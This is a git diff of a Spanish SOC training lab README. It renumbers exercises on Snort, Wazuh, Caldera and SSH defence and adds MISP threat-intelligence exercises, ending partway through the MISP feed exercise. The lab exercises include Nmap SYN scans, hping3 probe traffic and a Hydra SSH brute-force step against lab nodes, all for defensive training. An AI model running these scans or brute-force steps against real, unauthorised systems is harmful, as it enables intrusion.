@@ -6,19 +6,29 @@
 - [Introducción](#introducción)
 - [Visión general de los escenarios](#visión-general-de-los-escenarios)
   - [Level-01 – Mini SOC: detección y monitorización](#level-01--mini-soc-detección-y-monitorización)
+  - [Level-02 – MISP: Cyber Threat Intelligence](#level-02--misp-cyber-threat-intelligence)
 - [Normas generales del laboratorio](#normas-generales-del-laboratorio)
 - [Metodología de trabajo y evidencias](#metodología-de-trabajo-y-evidencias)
 - [Logs y verificaciones](#logs-y-verificaciones)
 ---
-- [Ejercicio 1 — Snort: detección de tráfico ICMP](#ejercicio-1--snort-detección-de-tráfico-icmp)
-- [Ejercicio 2 — Wazuh: agentes, integración de logs y dashboard](#ejercicio-2--wazuh-agentes-integración-de-logs-y-dashboard)
-- [Ejercicio 3 — MITRE Caldera: ataque básico y detección en Wazuh](#ejercicio-3--mitre-caldera-ataque-básico-y-detección-en-wazuh)
-- [Ejercicio 4 — Simulación Mini SOC: escaneo de reconocimiento con Nmap](#ejercicio-4--simulación-mini-soc-escaneo-de-reconocimiento-con-nmap)
-- [Ejercicio 5 — Reglas personalizadas en Snort y Wazuh](#ejercicio-5--reglas-personalizadas-en-snort-y-wazuh)
-- [Ejercicio 6 — Ataque de fuerza bruta contra servicio SSH](#ejercicio-6--ataque-de-fuerza-bruta-contra-servicio-ssh)
-- [Ejercicio 7 — Diseño e implementación de estrategia defensiva ante ataques a SSH](#ejercicio-7--diseño-e-implementación-de-estrategia-defensiva-ante-ataques-a-ssh)
-- [Ejercicio 8 — Creación de un KPI operativo basado en un ataque real](#ejercicio-8--creación-de-un-kpi-operativo-basado-en-un-ataque-real)
+- [Ejercicio 1.1 — Snort: detección de tráfico ICMP](#ejercicio-11--snort-detección-de-tráfico-icmp)
+- [Ejercicio 1.2 — Wazuh: agentes, integración de logs y dashboard](#ejercicio-12--wazuh-agentes-integración-de-logs-y-dashboard)
+- [Ejercicio 1.3 — MITRE Caldera: ataque básico y detección en Wazuh](#ejercicio-13--mitre-caldera-ataque-básico-y-detección-en-wazuh)
+- [Ejercicio 1.4 — Simulación Mini SOC: escaneo de reconocimiento con Nmap](#ejercicio-14--simulación-mini-soc-escaneo-de-reconocimiento-con-nmap)
+- [Ejercicio 1.5 — Reglas personalizadas en Snort y Wazuh](#ejercicio-15--reglas-personalizadas-en-snort-y-wazuh)
+- [Ejercicio 1.6 — Ataque de fuerza bruta contra servicio SSH](#ejercicio-16--ataque-de-fuerza-bruta-contra-servicio-ssh)
+- [Ejercicio 1.7 — Diseño e implementación de estrategia defensiva ante ataques a SSH](#ejercicio-17--diseño-e-implementación-de-estrategia-defensiva-ante-ataques-a-ssh)
+- [Ejercicio 1.8 — Creación de un KPI operativo basado en un ataque real](#ejercicio-18--creación-de-un-kpi-operativo-basado-en-un-ataque-real)
 - [Investigación Opcional — MITRE Caldera (profundización teórico-práctica)](#investigación-opcional--mitre-caldera-profundización-teórico-práctica)
+- [Ejercicio 2.0 — MISP: creación de un usuario y organización con mínimo privilegio](#ejercicio-20--misp-creación-de-un-usuario-y-organización-con-mínimo-privilegio)
+- [Ejercicio 2.1 — MISP: creación manual de un evento e IOCs](#ejercicio-21--misp-creación-manual-de-un-evento-e-iocs)
+- [Ejercicio 2.2 — MISP: consumo de un feed público de threat intelligence](#ejercicio-22--misp-consumo-de-un-feed-público-de-threat-intelligence)
+- [Ejercicio 2.3 — MISP: consultas a la API REST con curl](#ejercicio-23--misp-consultas-a-la-api-rest-con-curl)
+- [Ejercicio 2.4 — MISP: integración automática con Wazuh](#ejercicio-24--misp-integración-automática-con-wazuh)
+- [Ejercicio 2.5 — MISP: exportación de reglas Snort (NIDS)](#ejercicio-25--misp-exportación-de-reglas-snort-nids)
+- [Ejercicio 2.6 — MISP: caso de uso integral, escenario de exfiltración](#ejercicio-26--misp-caso-de-uso-integral-escenario-de-exfiltración)
+- [Ejercicio 2.7 — MISP: consolidar una ruta de ataque completa como caso de CTI](#ejercicio-27--misp-consolidar-una-ruta-de-ataque-completa-como-caso-de-cti)
+- [Investigación Opcional — MISP → Snort: automatización de IoCs e IDPS](#investigación-opcional--misp--snort-automatización-de-iocs-e-idps)
 
 ---
 
@@ -97,6 +107,42 @@ Este Level-01 se apoya en un “mini SOC” con ruta simple, pero suficiente par
 #### Nota importante (alcance y recursos)
 
 El Level-01 está diseñado para ser **simple y consistente**: prioriza que el alumnado domine el flujo end-to-end antes de añadir complejidad. Aun así, el mismo esquema permite crecer en dificultad según recursos disponibles (más fuentes de logs, más reglas, más escenarios, más volumen de eventos), sin cambiar la base del laboratorio.
+
+---
+
+### Level-02 – MISP: Cyber Threat Intelligence
+
+Nivel que **amplía** el Mini SOC del Level-01 añadiendo una plataforma de **Cyber Threat Intelligence (CTI)**: MISP. El foco pasa de "detectar y correlacionar" a **detectar y enriquecer con contexto**: no basta con saber que hubo tráfico sospechoso, sino entender si ese origen está ya fichado como amenaza conocida.
+
+#### Nodo adicional
+
+* **Nodo CTI (Threat Intelligence):** MISP _v2.5_
+  * S.O: Debian 12
+  * Configuración de recursos _(mínimo requerido)_:
+    * 2 CPU
+    * 4-6 GB de RAM
+    * 50 GB de Disco
+
+> **Requisito:** las 3 VMs del Level-01 (`snort-server`, `wazuh-manager`, `caldera-server`) deben estar desplegadas e integradas (`wazuh-snort.sh` ya ejecutado) antes de empezar este nivel, más esta 4ª VM `misp-server`.
+
+**Flujo operativo (qué se entrena)**
+
+1. **Generación de inteligencia** propia (evento manual) y externa (feed) en MISP.
+2. **Consulta programática** de esa inteligencia (API REST autenticada).
+3. **Enriquecimiento automático** de alertas de Wazuh con contexto de MISP.
+4. **Investigación ampliada**: pasar de "hubo un ataque" a "es una IP con antecedentes conocidos".
+
+**Qué aprende el alumnado (competencias)**
+
+* Aplicar el principio de **mínimo privilegio** (cuentas y roles limitados) en una plataforma de seguridad, en vez de operar siempre como administrador.
+* Modelar inteligencia de amenazas (eventos, atributos, flag IDS, TLP/distribución).
+* Diferenciar inteligencia propia frente a inteligencia de fuentes externas (feeds).
+* Consultar una API REST de seguridad con autenticación por clave.
+* Entender cómo un SIEM puede automatizar el enriquecimiento de alertas con CTI, y qué valor aporta eso al triage de un SOC.
+
+#### Nota importante (alcance y recursos)
+
+En el Ejercicio 2.2, el feed de threat intelligence que se active debe ser **pequeño y curado**: la VM `misp-server` está dimensionada para un laboratorio educativo (50 GB de disco), no para ingerir feeds masivos de producción.
 
 ---
 
@@ -316,7 +362,7 @@ tail -f ~/caldera-logs/caldera-install.log
 
 ---
 
-## Ejercicio 1 — Snort: detección de tráfico ICMP 
+## Ejercicio 1.1 — Snort: detección de tráfico ICMP 
 
 ### Objetivo
 
@@ -445,7 +491,7 @@ Incluya:
 
 ---
 
-## Ejercicio 2 — Wazuh: agentes, integración de logs y dashboard
+## Ejercicio 1.2 — Wazuh: agentes, integración de logs y dashboard
 
 ### Objetivo
 
@@ -465,7 +511,7 @@ Incluya:
 
 ---
 
-### 2.1. Preparación e identificación (Dashboard)
+### 1.2.1. Preparación e identificación (Dashboard)
 
 #### Identificación de Endpoints Summary
 
@@ -487,7 +533,7 @@ No ejecute búsquedas todavía; únicamente localice el módulo.
 
 * Capture la pantalla de **Threat Hunting**.
 
-### 2.2. Ejecución
+### 1.2.2. Ejecución
 
 #### Inicio del asistente de despliegue (Dashboard / Wazuh Manager)
 
@@ -572,7 +618,7 @@ Regrese al Dashboard:
 
 * Capture el agente en estado **Active**.
 
-### 2.3. Integración de Snort (Nodo Snort)
+### 1.2.3. Integración de Snort (Nodo Snort)
 
 #### Configuración de ingesta en el agente: lectura de `alert_fast.txt`
 
@@ -618,7 +664,7 @@ sudo systemctl restart wazuh-agent && sudo systemctl status wazuh-agent
 
 * Capture el `status` tras el reinicio (servicio activo).
 
-### 2.4. Validación end-to-end (Snort → Wazuh)
+### 1.2.4. Validación end-to-end (Snort → Wazuh)
 
 #### Generación de eventos en Snort (Nodo Snort)
 
@@ -650,7 +696,7 @@ ping -c 4 <IP_tarjeta_snort>
 
 * Capture la salida del `ping`.
 
-### 2.5. Visualización en Wazuh (Eventos y Threat Hunting)
+### 1.2.5. Visualización en Wazuh (Eventos y Threat Hunting)
 
 #### Acceso a Threat Hunting y selección del agente
 
@@ -734,7 +780,7 @@ Redacte una conclusión técnica:
 
 ---
 
-## Ejercicio 3 — MITRE Caldera: ataque básico y detección en Wazuh
+## Ejercicio 1.3 — MITRE Caldera: ataque básico y detección en Wazuh
 
 ### Objetivo
 
@@ -755,7 +801,7 @@ El ejercicio permite comprender el flujo:
 
 ---
 
-### 3.1. Preparación e identificación (Caldera + Wazuh)
+### 1.3.1. Preparación e identificación (Caldera + Wazuh)
 
 #### Acceso al Dashboard de MITRE Caldera
 
@@ -790,7 +836,7 @@ En el Dashboard de Caldera:
 
 * Capture el listado de **Agents** donde se vea el agente del nodo Snort en estado **Alive**.
 
-### 3.2. Ejecución (Caldera)
+### 1.3.2. Ejecución (Caldera)
 
 #### Creación de la operación básica
 
@@ -842,7 +888,7 @@ sudo su
 
 * Capture la vista de **tasks/abilities** donde se vean los comandos ejecutados con estado **SUCCESS** y su salida.
 
-### 3.3. Validación end-to-end (Caldera → Wazuh)
+### 1.3.3. Validación end-to-end (Caldera → Wazuh)
 
 #### Búsqueda de eventos en Wazuh (Threat Hunting / Events)
 
@@ -931,7 +977,7 @@ Incluya:
 
 ---
 
-## Ejercicio 4 — Simulación Mini SOC: escaneo de reconocimiento con Nmap
+## Ejercicio 1.4 — Simulación Mini SOC: escaneo de reconocimiento con Nmap
 
 ### Objetivo
 
@@ -963,7 +1009,7 @@ sudo snort -i ens3 -c /etc/snort/snort.lua -A alert_fast -k none -l /var/log/sno
 
 ---
 
-### 4.1. Preparación e identificación (estado inicial)
+### 1.4.1. Preparación e identificación (estado inicial)
 
 #### Verificación de Snort en ejecución (Nodo Snort)
 
@@ -979,7 +1025,7 @@ sudo snort -i ens3 -c /etc/snort/snort.lua -A alert_fast -k none -l /var/log/sno
 
 > Si Snort no está corriendo, el ejercicio podría dar un “falso negativo” (no detección por falta de captura).
 
-### 4.2. Ejecución (reconocimiento SIN detección)
+### 1.4.2. Ejecución (reconocimiento SIN detección)
 
 #### Ejecución del escaneo Nmap (desde Caldera)
 
@@ -989,7 +1035,7 @@ Desde el terminal del nodo Caldera, ejecute una habilidad de **Command Execution
 nmap -sS -Pn <IP_NODO_SNORT>
 ```
 
-### 4.3. Análisis en Wazuh (sin reglas activas)
+### 1.4.3. Análisis en Wazuh (sin reglas activas)
 
 Acceda al **Dashboard de Wazuh**.
 
@@ -1014,7 +1060,7 @@ Si es necesario, vuelva a lanzarlo:
 sudo snort -i ens3 -c /etc/snort/snort.lua -A alert_fast -k none -l /var/log/snort
 ```
 
-### 4.4. Activación de reglas de detección (Snort + Wazuh)
+### 1.4.4. Activación de reglas de detección (Snort + Wazuh)
 
 #### Activar regla en Snort (Nodo Snort)
 
@@ -1089,7 +1135,7 @@ Reinicie Wazuh:
 sudo systemctl restart wazuh-manager
 ```
 
-### 4.5. Reejecución del reconocimiento (CON detección)
+### 1.4.5. Reejecución del reconocimiento (CON detección)
 
 Desde Caldera, ejecute **el mismo comando**:
 
@@ -1097,7 +1143,7 @@ Desde Caldera, ejecute **el mismo comando**:
 nmap -sS -Pn <IP_NODO_SNORT>
 ```
 
-### 4.6. Análisis de detección en Wazuh (detección esperada)
+### 1.4.6. Análisis de detección en Wazuh (detección esperada)
 
 En el Dashboard de Wazuh:
 
@@ -1162,7 +1208,7 @@ Incluya:
 
 ---
 
-## Ejercicio 5 — Reglas personalizadas en Snort y Wazuh
+## Ejercicio 1.5 — Reglas personalizadas en Snort y Wazuh
 
 ### Objetivo
 
@@ -1194,7 +1240,7 @@ sudo snort -i ens3 -c /etc/snort/snort.lua -A alert_fast -k none -l /var/log/sno
 
 ---
 
-### 5.1. Preparación e identificación (estado inicial)
+### 1.5.1. Preparación e identificación (estado inicial)
 
 #### Captura activa en Snort (Nodo Snort)
 
@@ -1217,7 +1263,7 @@ sudo apt install -y hping3
 
 > ℹ️ Recomendable: crear un script con los 3 envíos (por ejemplo `h3ping.sh`) y darle permisos `+x`.
 
-### 5.2. Ejecución (tráfico CON/SIN detección con reglas actuales)
+### 1.5.2. Ejecución (tráfico CON/SIN detección con reglas actuales)
 
 > En esta fase se busca observar el comportamiento con el set actual de reglas.
 
@@ -1249,7 +1295,7 @@ sudo hping3 -S -p 1003 <IP_NODO_SNORT> -c 1
 * [✖] No aparecen alertas de Port Knocking.
 * [⚠] Asegúrese de que Snort esté corriendo para capturar tráfico.
 
-### 5.3. Activación de reglas de detección (Snort + Wazuh)
+### 1.5.3. Activación de reglas de detección (Snort + Wazuh)
 
 #### Activar reglas en Snort (Nodo Snort)
 
@@ -1351,7 +1397,7 @@ Reiniciar Wazuh:
 sudo systemctl restart wazuh-manager
 ```
 
-### 5.4. Reejecución del tráfico (CON detección)
+### 1.5.4. Reejecución del tráfico (CON detección)
 
 Desde Caldera/atacante, ejecute de nuevo:
 
@@ -1389,7 +1435,7 @@ sudo tail -f /var/log/snort/alert_fast.txt
 [**] [1:1000022:3] "Posible port knocking detectado"
 ```
 
-### 5.5. Análisis de detección en Wazuh
+### 1.5.5. Análisis de detección en Wazuh
 
 En el Dashboard de Wazuh:
 
@@ -1543,7 +1589,7 @@ Incluya:
 
 ---
 
-## Ejercicio 6 — Ataque de fuerza bruta contra servicio SSH
+## Ejercicio 1.6 — Ataque de fuerza bruta contra servicio SSH
 
 ### Objetivo general
 
@@ -1574,7 +1620,7 @@ Este ejercicio simula este escenario desde el punto de vista ofensivo.
 
 ---
 
-### 6.1. Preparación e identificación (reconocimiento + entorno)
+### 1.6.1. Preparación e identificación (reconocimiento + entorno)
 
 #### Reconocimiento inicial
 
@@ -1624,7 +1670,7 @@ El alumnado deberá:
 
 Este proceso forma parte del aprendizaje.
 
-### 6.2. Ejecución (ataque con Hydra)
+### 1.6.2. Ejecución (ataque con Hydra)
 
 #### Sintaxis básica de Hydra
 
@@ -1652,7 +1698,7 @@ Durante el ataque, el alumnado debe observar:
 * Mensajes mostrados por Hydra.
 * Tiempo hasta encontrar credencial.
 
-### 6.3. Validación end-to-end (credencial → acceso → detección)
+### 1.6.3. Validación end-to-end (credencial → acceso → detección)
 
 #### Verificación de acceso
 
@@ -1682,9 +1728,9 @@ Compruebe si el entorno:
 
 Lo esperado es que **no exista detección específica**.
 
-> ℹ️ **Nota:** Este resultado será la base para el Ejercicio 7.
+> ℹ️ **Nota:** Este resultado será la base para el Ejercicio 1.7.
 
-### 6.4. Mapeo MITRE ATT&CK y creación del *layout* entregable (ruta completa del ataque)
+### 1.6.4. Mapeo MITRE ATT&CK y creación del *layout* entregable (ruta completa del ataque)
 
 En este ejercicio el alumnado **no debe mapear solo la fuerza bruta**, sino **la ruta completa** de un ataque coherente con lo visto en el LAB (p. ej. reconocimiento con Nmap → ataque a credenciales → acceso SSH → ejecución/descubrimiento/escalada con comandos).
 El resultado final **es un layer entregable** en **ATT&CK Navigator**.
@@ -1824,7 +1870,7 @@ Resultado esperado:
 
 ---
 
-## Ejercicio 7 — Diseño e implementación de estrategia defensiva ante ataques a SSH
+## Ejercicio 1.7 — Diseño e implementación de estrategia defensiva ante ataques a SSH
 
 ### Objetivo general
 
@@ -1852,7 +1898,7 @@ En este ejercicio se busca **cerrar esa brecha**, aplicando controles defensivos
 
 > Las IPs y credenciales pueden consultarse en: `cat log/level.log`
 
-* Haber completado el **Ejercicio 6** (ataque con Hydra).
+* Haber completado el **Ejercicio 1.6** (ataque con Hydra).
 * Acceso al **Dashboard de Wazuh** (nodo monitor).
 * Acceso SSH al **nodo objetivo** (donde corre SSH) para aplicar hardening si aplica.
 * Acceso al **nodo Wazuh Manager** para modificar reglas / respuesta activa si aplica.
@@ -1860,7 +1906,7 @@ En este ejercicio se busca **cerrar esa brecha**, aplicando controles defensivos
 
 ---
 
-### 7.1. Preparación e identificación (análisis inicial)
+### 1.7.1. Preparación e identificación (análisis inicial)
 
 #### Análisis inicial del problema
 
@@ -1886,7 +1932,7 @@ Definir una estrategia que combine varios enfoques:
 
 Se espera una breve justificación de por qué se elige cada control.
 
-### 7.2. Ejecución (implementación de controles)
+### 1.7.2. Ejecución (implementación de controles)
 
 #### Métodos defensivos sugeridos (visión general)
 
@@ -1953,7 +1999,7 @@ Debe quedar claro:
 
 No se exige un conjunto concreto de herramientas, solo que se cumpla el objetivo.
 
-### 7.3. Validación (repetición del ataque)
+### 1.7.3. Validación (repetición del ataque)
 
 Se debe repetir el ataque del ejercicio anterior y comprobar:
 
@@ -1962,7 +2008,7 @@ Se debe repetir el ataque del ejercicio anterior y comprobar:
 * Reducción de intentos exitosos.
 * Diferencia de comportamiento respecto al ejercicio previo.
 
-### 7.4. Mapeo MITRE D3FEND (controles defensivos aplicados)
+### 1.7.4. Mapeo MITRE D3FEND (controles defensivos aplicados)
 
 En este ejercicio el alumnado debe **traducir los controles defensivos que ha aplicado** (Wazuh rules/correlación, bloqueos, hardening SSH, etc.) a **técnicas D3FEND**, de forma que quede una **ruta defensiva completa** y justificable.
 
@@ -2000,7 +2046,7 @@ El alumnado debe organizar sus controles en estas **tres fases D3FEND**, explica
 * **Detect (Detección/Visibilidad):** generar señal útil en SIEM (Wazuh), umbrales, correlación, análisis.
 * **Isolate (Contención):** cortar el ataque (bloqueo IP, account lock, SG/firewall, active response).
 
-> ℹ️ **Importante**: aquí el alumnado no “elige al azar”. Debe mapear **lo que realmente configuró** en el Ejercicio 7 (y si propone algo extra, debe marcarlo como “hipótesis/mejora”, separado de lo implementado).
+> ℹ️ **Importante**: aquí el alumnado no “elige al azar”. Debe mapear **lo que realmente configuró** en el Ejercicio 1.7 (y si propone algo extra, debe marcarlo como “hipótesis/mejora”, separado de lo implementado).
 
 #### 3) Plantilla guiada por control (lo que deben rellenar)
 
@@ -2067,7 +2113,7 @@ Reflexión final:
 
 ---
 
-## Ejercicio 8 — Creación de un KPI operativo basado en un ataque real
+## Ejercicio 1.8 — Creación de un KPI operativo basado en un ataque real
 
 ### Objetivo
 
@@ -2099,7 +2145,7 @@ Este patrón **no se trata como un evento aislado**, sino como un **caso recurre
 
 ---
 
-### 8.1. Preparación e identificación (selección del ataque base)
+### 1.8.1. Preparación e identificación (selección del ataque base)
 
 #### Identificación del ataque observado
 
@@ -2119,7 +2165,7 @@ Documente brevemente:
 
 > **Este ataque será la base del KPI.**
 
-### 8.2. Definición del KPI operativo
+### 1.8.2. Definición del KPI operativo
 
 #### Diseño del KPI
 
@@ -2149,7 +2195,7 @@ Wazuh – reglas relacionadas con `sudo` (`rule.id` correspondiente).
 **Frecuencia de medida:**
 Tiempo real / revisión diaria.
 
-### 8.3. Implementación del KPI en Wazuh
+### 1.8.3. Implementación del KPI en Wazuh
 
 #### Identificación del patrón en Wazuh
 
@@ -2384,6 +2430,1013 @@ Para cada bloque seleccionado, redactar:
 * **Resultado observado:** qué pasó (éxito/fallo) y por qué crees que ocurrió.
 * **Evidencias:** capturas y/o output.
 * **Conclusión:** qué aprendiste y qué mejorarías en una siguiente iteración.
+
+---
+
+## Ejercicio 2.0 — MISP: creación de un usuario y organización con mínimo privilegio
+
+### Objetivo
+
+Aplicar el principio de **mínimo privilegio**, ya exigido en las [Normas generales del laboratorio](#normas-generales-del-laboratorio) (*"usar cuentas/roles justos para cada tarea, y documentar cuándo/por qué se eleva"*), creando una organización y un usuario propios del laboratorio en vez de operar con la cuenta de administrador para las tareas del día a día.
+
+### Prerrequisitos
+
+* MISP desplegado (`MISP/install-misp.sh`) y accesible por navegador (`https://IP_MISP`).
+* Credenciales de **administrador** de MISP (se usan únicamente en este ejercicio, para la configuración inicial):
+
+```bash
+cat ~/misp-logs/misp-settings.txt
+```
+
+---
+
+### 2.0.1. Preparación e identificación (acceso como administrador)
+
+Acceda a `https://IP_MISP` (acepte el aviso del certificado autofirmado) e inicie sesión con el usuario y contraseña de administrador (`- Admin Username` / `- Admin Password` en `misp-settings.txt`).
+
+> Este es el **único** ejercicio del nivel (junto con partes del 2.2) donde se usa la cuenta de administrador, y es precisamente para dejar de necesitarla en el resto.
+
+**Evidencie**
+
+* Captura del login como administrador.
+
+### 2.0.2. Ejecución (organización + usuario de laboratorio)
+
+#### Crear la organización
+
+1. **Administration → List Organisations → Add Organisation**.
+2. Rellene un nombre identificable, por ejemplo `SOC-LAB`.
+3. Guarde.
+
+**Evidencie**
+
+* Captura de la organización creada.
+
+#### Crear el usuario
+
+1. **Administration → List Users → Add User**.
+2. Rellene:
+
+   * **Email:** el que use el alumnado (por ejemplo, `analista@soc-lab.local`).
+   * **Org:** `SOC-LAB` (la creada arriba).
+   * **Role:** el rol **más bajo** que permita crear y publicar eventos propios: `Publisher`
+   * Marque la casilla **Set Password** y escriba la contraseña ahí mismo.
+3. Guarde. Anote la contraseña que fijó en el paso anterior.
+
+**Evidencie**
+
+* Captura del usuario creado, con su rol visible.
+
+#### Verificar el acceso
+
+1. Cierre la sesión de administrador.
+2. Inicie sesión con el nuevo usuario y la contraseña fijada con **Set Password**.
+3. Confirme que el Dashboard funciona con normalidad, pero que el menú **Administration** no está disponible.
+
+**Evidencie**
+
+* Captura del login con el usuario de laboratorio.
+* Captura mostrando que el acceso a Administration ya no aparece.
+
+### Validación / Troubleshooting
+
+* Si el usuario no puede publicar eventos (lo comprobará en el Ejercicio 2.1), vuelva como administrador a **Administration → List Users → Edit User**, y cambie el **Role** a `Publisher` (en **List Roles** puede comprobar antes que ese rol incluye "Manage and Publish Organisation Events"). **Documente ese cambio y su motivo**: es exactamente el "documentar cuándo/por qué se eleva" de la norma de mínimo privilegio.
+* ⚠️ **Importante:** al guardar el cambio de rol, MISP pide **confirmar la contraseña del propio administrador** antes de aplicarlo. Si se omite ese paso, el formulario puede parecer guardado pero el rol **no cambia realmente**: vuelva a **List Users** y confirme que la columna de rol ya dice `Publisher` antes de continuar.
+* Tras confirmar el cambio, cierre sesión del usuario de laboratorio y vuelva a iniciarla (o use una ventana de incógnito) para que la sesión recoja el nuevo rol.
+* Si se pierde u olvida la contraseña, un administrador puede restablecerla desde **List Users → Edit User → Set Password**.
+
+### Evidencias a entregar
+
+* Organización creada.
+* Usuario creado (con su rol).
+* Login exitoso con el usuario de laboratorio.
+* Comprobación de que el acceso a Administration está restringido.
+
+### Conclusión final
+
+Incluya:
+
+* Qué rol se asignó y por qué (y si tuvo que elevarse, el motivo documentado).
+* Qué puede y qué **no** puede hacer este usuario frente al administrador.
+* Por qué operar con una cuenta de privilegio reducido es más realista que usar siempre la cuenta de admin, y cómo conecta con el principio de mínimo privilegio ya exigido en el resto del laboratorio.
+
+---
+
+## Ejercicio 2.1 — MISP: creación manual de un evento e IOCs
+
+### Objetivo
+
+Familiarizarse con el modelo de datos de MISP (**Event → Attribute → flag IDS → Tag**) creando manualmente inteligencia propia sobre la actividad que ya se genera en el Level-01: la IP del nodo `caldera-server`.
+
+### Prerrequisitos
+
+* MISP desplegado (`MISP/install-misp.sh`) y accesible por navegador (`https://IP_MISP`).
+* **Ejercicio 2.0 completado**: usuario y organización de laboratorio creados. En este ejercicio **no se usa** la cuenta de administrador.
+* IP del nodo `caldera-server`.
+
+---
+
+### 2.1.1. Preparación e identificación (acceso a MISP)
+
+#### Acceso al Dashboard de MISP
+
+Desde un navegador, acceda a:
+
+```
+https://IP_MISP
+```
+
+El certificado es autofirmado (lo genera `install-misp.sh`): acepte el aviso de seguridad del navegador, es esperado en este laboratorio.
+
+Inicie sesión con el **usuario de laboratorio** creado en el Ejercicio 2.0 (no con la cuenta de administrador, aplicando el principio de mínimo privilegio).
+
+**Evidencie**
+
+* Captura de la pantalla principal de MISP tras iniciar sesión.
+
+### 2.1.2. Ejecución (creación del evento)
+
+#### Crear el evento
+
+1. En el menú superior: **Event Actions → Add Event**.
+2. Rellene los metadatos mínimos:
+
+   * **Date:** fecha actual.
+   * **Distribution:** `Your organisation only` (suficiente para este ejercicio de laboratorio).
+   * **Threat Level:** `Medium` (u otro, justifíquelo).
+   * **Analysis:** `Initial`.
+   * **Event info:** por ejemplo, `LAB - Actividad de caldera-server detectada por Snort`.
+3. Pulse **Submit**.
+
+**Evidencie**
+
+* Captura del evento recién creado (metadata visible).
+
+#### Añadir atributos (IOCs)
+
+1. Dentro del evento, **Add Attribute**.
+2. Cree un primer atributo:
+
+   * **Category:** `Network activity`
+   * **Type:** `ip-src`
+   * **Value:** IP de `caldera-server`
+   * **Distribution:** `Inherit event` (así el atributo mantiene el mismo alcance, `Your organisation only`, que fijamos para el evento, en vez de quedar potencialmente más expuesto que él).
+   * Marque la casilla **IDS** (`For Intrusion Detection System`): es lo que convierte el atributo en un IOC exportable.
+3. Añada un `Contextual Comment` describiendo el contexto (por ejemplo, "IP usada en el Level-01 para simular ataques con Caldera").
+4. Guarde los cambios.
+
+**Evidencie**
+
+* Captura de los atributos del evento, mostrando el flag **IDS** activo en el atributo `ip-src`.
+
+#### Publicar el evento
+
+1. En la vista del evento, pulse **Publish Event** y confirme.
+2. MISP pedirá confirmación porque la publicación notificaría a otras organizaciones en un despliegue real; en este laboratorio solo sirve para dejar el evento activo y consultable.
+
+**Evidencie**
+
+* Captura del evento en estado **Published**.
+
+#### (Opcional) Enriquecer con Taxonomía TLP y Galaxy ATT&CK
+
+Hasta aquí el evento tiene un IOC, pero le falta contexto estructurado. MISP ofrece dos mecanismos para eso:
+
+* **Activar la taxonomía TLP (paso previo):** MISP trae muchas taxonomías precargadas, pero la mayoría vienen **desactivadas** por defecto (incluida `tlp`), así que no aparecerán en el buscador de tags hasta activarlas. Vaya a **Event Actions** (barra superior) → **List Taxonomies** (visible con `Publisher`), busque `tlp` y ábrala. A partir de aquí, **Enable** y **Update Taxonomies** solo están disponibles para el rol administrador, así que este paso concreto debe hacerse como admin: pulse **Enable** y después **Update Taxonomies** para que el cambio surta efecto. Documente esa elevación puntual, como en ejercicios anteriores. Enable/Update dejan la taxonomía disponible en el sistema, pero para que sus etiquetas aparezcan realmente en el buscador de **Add Tag** aún falta activar las tags concretas: dentro de la taxonomía `tlp` ya abierta, en el listado de tags (columna **Active Tags**), marque como activas las que vaya a usar (por ejemplo `tlp:amber`).
+* **Taxonomía TLP:** en la vista del evento, **Add a tag** → busque `tlp:` y elija el nivel adecuado (por ejemplo `tlp:amber`, "compartible dentro de la organización, no fuera"). No confunda esto con `Distribution`: `Distribution` controla técnicamente **quién puede ver** el evento en MISP; el tag **TLP** es la instrucción de **cómo debe tratar la información** quien la reciba, aunque ambos apunten en la misma dirección.
+* **Galaxy MITRE ATT&CK:** en la vista del evento, **Add new cluster** → busque `Attack Pattern` (galaxy de MITRE ATT&CK) y seleccione la técnica que corresponda a la actividad observada (por ejemplo, `T1595 - Active Scanning`, si el evento documenta el reconocimiento con Nmap del Ejercicio 1.4 del Level-01). Esto conecta directamente con el mapeo a ATT&CK Navigator que ya hicisteis "aparte" en los Ejercicios 1.6-1.7: aquí veis que MISP puede hacer ese mismo mapeo dentro de la propia plataforma de CTI. A diferencia de las taxonomías, las Galaxies suelen venir **activadas** por defecto; si no encuentra `Attack Pattern` en el buscador, revise igualmente en **Administration → List Galaxies** que esté habilitada.
+
+**Evidencie (si se realiza)**
+
+* Captura de la taxonomía `tlp` activada en **Taxonomies**.
+* Captura del tag TLP añadido al evento.
+* Captura del Galaxy/técnica ATT&CK añadida al evento.
+
+### Validación / Troubleshooting
+
+* Si no aparece el botón **Publish**, compruebe que el evento tiene al menos un atributo.
+* Si el atributo no queda marcado como IDS, edítelo y marque la casilla explícitamente (no todas las categorías la activan por defecto).
+
+### Evidencias a entregar
+
+* Captura del login en MISP.
+* Captura del evento creado (metadata).
+* Captura de los atributos, con el flag IDS visible en el `ip-src`.
+* Captura del evento publicado.
+* (Si se realiza) captura del tag TLP y de la técnica ATT&CK asociados al evento.
+
+### Conclusión final
+
+Incluya:
+
+* Qué es un **Event** y qué es un **Attribute** en MISP, y cómo se relacionan.
+* Para qué sirve el flag **IDS**
+* Qué es la **distribución** y por qué importa en un contexto real (compartir o no compartir con otras organizaciones).
+* (Si se realiza) diferencia entre `Distribution`  y el tag **TLP** , y qué aporta enlazar el evento a una técnica **MITRE ATT&CK** vía Galaxy frente a mapearlo solo en el Navigator externo.
+* Cómo este evento servirá de base para los Ejercicios 2.3 (consulta por API) y 2.4 (integración automática con Wazuh).
+
+---
+
+## Ejercicio 2.2 — MISP: consumo de un feed público de threat intelligence
+
+### Objetivo
+
+Dar de alta manualmente, activar y sincronizar un **feed externo** de indicadores de amenaza, activar además uno de los feeds nativos que MISP ya trae preconfigurados para comparar formatos, y diferenciar la inteligencia propia (Ejercicio 2.1) de la inteligencia procedente de fuentes de terceros.
+
+### Prerrequisitos
+
+* Acceso de **administrador** a MISP.
+
+  > ℹ️ **Nota de mínimo privilegio:** junto con el Ejercicio 2.0, este es el único ejercicio que requiere la cuenta de admin. La gestión de feeds afecta a toda la instancia de MISP (no solo a una organización), y MISP la restringe a administración de servidor: es una elevación de privilegio justificada y documentada, no un atajo.
+* Conectividad a Internet desde `misp-server`.
+* Recomendable: Ejercicio 2.1 completado.
+
+---
+
+### 2.2.1. Preparación e identificación (elección de la fuente)
+
+> ⚠️ **Importante:** no pulse "Load default feed metadata": ese botón carga un catálogo mucho más amplio (decenas de feeds públicos, algunos con cientos de miles de indicadores) que puede llenar el disco de `misp-server` (50 GB) o tardar horas en sincronizar.
+
+En el Dashboard de MISP:
+
